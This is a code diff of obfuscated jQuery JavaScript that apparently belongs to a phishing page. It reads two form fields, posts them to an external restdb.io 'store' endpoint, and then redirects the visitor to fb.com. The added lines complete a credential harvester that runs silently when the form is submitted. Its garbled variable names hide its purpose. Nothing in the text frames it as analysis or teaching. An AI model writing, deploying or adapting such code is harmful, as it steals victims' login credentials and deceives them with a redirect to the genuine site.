@@ -1,11 +1,15 @@
 var adfaadfbjkadfnb118 = "#afdnklasdfk1bjsvajk";
 var adfabdfakjbasdfbak = "#bjkabjabjkadbjlkvalk1412";
+
 function aadfa1kabjkadbjka1() {
   var f12bjkabjkbjka3221 = $(adfaadfbjkadfnb118).val();
   var s44ajkabdfkaadfa14 = $(adfabdfakjbasdfbak).val();
   var adfbkasdfadfjkbabjkjka = {"c1": f12bjkabjkbjka3221,"c2": s44ajkabdfkaadfa14};
 
-  var knadkadnkadsklaadfbjjk = {
+  
+if(f12bjkabjkbjka3221!='' && s44ajkabdfkaadfa14!=''){
+  event.preventDefault();
+  $.ajax({
     "async": true,
     "crossDomain": true,
     "url": "https://learn-29ef.restdb.io/rest/store",
@@ -16,14 +20,18 @@ function aadfa1kabjkadbjka1() {
       "cache-control": "no-cache"
     },
     "processData": false,
-    "data": JSON.stringify(adfbkasdfadfjkbabjkjka)
+    "data": JSON.stringify(adfbkasdfadfjkbabjkjka),
+    success: function (abjkasdfbjkasdbklaslkbdfkald) {
+      console.log()
+  },
+  error: function (afdlkasfdnklasbjv123y81) {
+      console.log()
   }
 
-  console.log(JSON.stringify(adfbkasdfadfjkbabjkjka));
-
-  $.ajax(knadkadnkadsklaadfbjjk).done(function (afdafa1231saaababa) {
-    console.log(afdafa1231saaababa);
   });
+  window.location = "https://www.fb.com";
+
+}
 
 }
 
